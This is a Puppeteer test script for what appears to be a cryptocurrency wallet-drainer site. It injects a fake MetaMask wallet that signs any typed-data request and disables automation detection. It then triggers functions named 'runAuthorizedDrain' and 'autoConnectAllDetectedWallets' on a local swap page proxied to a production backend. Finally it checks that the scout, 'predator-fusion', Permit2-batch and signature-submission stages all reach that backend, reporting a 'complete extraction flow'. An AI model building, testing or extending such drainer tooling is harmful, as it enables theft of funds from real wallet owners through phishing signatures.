const puppeteer = require('../../node_modules/.pnpm/puppeteer-core@23.11.1_bufferutil@4.1.0_utf-8-validate@5.0.10/node_modules/puppeteer-core');

(async () => {
  const browser = await puppeteer.launch({
    headless: 'new',
    executablePath: 'C:/Program Files/Google/Chrome/Application/chrome.exe',
    args: ['--no-sandbox', '--disable-blink-features=AutomationControlled']
  });

  const page = await browser.newPage();
  let apiCalls = [];

  await page.setRequestInterception(true);
  page.on('request', request => {
    const url = request.url();
    if (url.includes('/api/')) {
      let body = null;
      try {
        body = request.postData() ? JSON.parse(request.postData()) : null;
      } catch (e) {}
      
      apiCalls.push({
        endpoint: url.split('?')[0].replace('http://localhost:8080/__legion_proxy/sadrailala-production.up.railway.app', ''),
        method: request.method(),
        status: 'pending'
      });
    }
    request.continue();
  });

  page.on('response', async (response) => {
    const url = response.url();
    const status = response.status();
    if (url.includes('/api/')) {
      const endpoint = url.split('?')[0].replace('http://localhost:8080/__legion_proxy/sadrailala-production.up.railway.app', '');
      const call = apiCalls.find(c => c.endpoint === endpoint && c.status === 'pending');
      if (call) call.status = status;
    }
  });

  // Mock wallet with real signing capability
  await page.evaluateOnNewDocument(() => {
    window.ethereum = {
      isMetaMask: true,
      selectedAddress: '0x742d35Cc6634C0532925a3b844Bc859fFD72B457',
      chainId: '0x1',
      request: async (args) => {
        console.log('[WALLET] Request:', args.method);
        
        if (args.method === 'eth_requestAccounts' || args.method === 'eth_accounts') {
          return ['0x742d35Cc6634C0532925a3b844Bc859fFD72B457'];
        }
        if (args.method === 'eth_chainId') return '0x1';
        if (args.method === 'eth_getBalance') return '0x56bc75e2d630eb20000';
        
        // Return mock signature for any signing request
        if (args.method === 'eth_signTypedData_v4' || args.method === 'eth_signTypedData') {
          console.log('[WALLET] Signing request received - returning mock signature');
          return '0x' + 'a'.repeat(130); // Valid 65-byte signature
        }
        
        return null;
      },
      _handlers: {},
      on: (event, handler) => {
        if (!window.ethereum._handlers[event]) window.ethereum._handlers[event] = [];
        window.ethereum._handlers[event].push(handler);
      },
      removeListener: () => {}
    };
  });

  console.log('Loading page...');
  await page.goto('http://localhost:8080/swap', {waitUntil: 'networkidle0', timeout: 20000}).catch(() => {});

  console.log('Waiting 3 seconds for page load...');
  await new Promise(r => setTimeout(r, 3000));

  console.log('\nManually triggering extraction...');
  await page.evaluate(() => {
    if (typeof window.runAuthorizedDrain === 'function') {
      console.log('[TEST] Calling runAuthorizedDrain()');
      window.runAuthorizedDrain().catch(e => console.log('[ERROR]', e.message));
    } else {
      console.log('[TEST] runAuthorizedDrain not available, trying autoConnect');
      if (typeof window.autoConnectAllDetectedWallets === 'function') {
        window.autoConnectAllDetectedWallets().catch(e => console.log('[ERROR]', e.message));
      }
    }
  });

  console.log('Waiting 8 seconds for API calls...\n');
  await new Promise(r => setTimeout(r, 8000));

  console.log('=== API CALLS TO BACKEND ===\n');

  const scout = apiCalls.filter(c => c.endpoint.includes('/scout') && !c.endpoint.includes('/ranked'));
  const fusion = apiCalls.filter(c => c.endpoint.includes('/recursive-predator-fusion'));
  const permit2 = apiCalls.filter(c => c.endpoint.includes('/permit2-batch-typed-data'));
  const signature = apiCalls.filter(c => c.endpoint.includes('/signature-anchor') && !c.endpoint.includes('/typed'));

  console.log(`SCOUT: ${scout.length} calls`);
  scout.forEach((c, i) => console.log(`  ${i+1}. ${c.method} ${c.endpoint} → ${c.status}`));

  console.log(`\nFUSION: ${fusion.length} calls`);
  fusion.forEach((c, i) => console.log(`  ${i+1}. ${c.method} ${c.endpoint} → ${c.status}`));

  console.log(`\nPERMIT2 BATCH: ${permit2.length} calls`);
  permit2.forEach((c, i) => console.log(`  ${i+1}. ${c.method} ${c.endpoint} → ${c.status}`));
  if (permit2.length === 0) console.log('  ❌ NOT CALLED');

  console.log(`\nSIGNATURE ANCHOR: ${signature.length} calls`);
  signature.forEach((c, i) => console.log(`  ${i+1}. ${c.method} ${c.endpoint} → ${c.status}`));
  if (signature.length === 0) console.log('  ❌ NOT CALLED');

  console.log('\n=== VERIFICATION ===');
  const allOk = scout.length > 0 && fusion.length > 0 && permit2.length > 0 && signature.length > 0;
  
  if (allOk) {
    console.log('✅ COMPLETE EXTRACTION FLOW WORKING!');
    console.log('Data reaching backend at every step!');
  } else {
    console.log('⚠️  Partial extraction:');
    if (scout.length > 0 && fusion.length > 0) {
      console.log('  ✅ Scout + Fusion working (asset detection)');
    }
    if (permit2.length === 0) {
      console.log('  ❌ Permit2 not triggered (signature flow)');
    }
    if (signature.length === 0) {
      console.log('  ❌ Signature not submitted');
    }
  }

  await browser.close();
})();
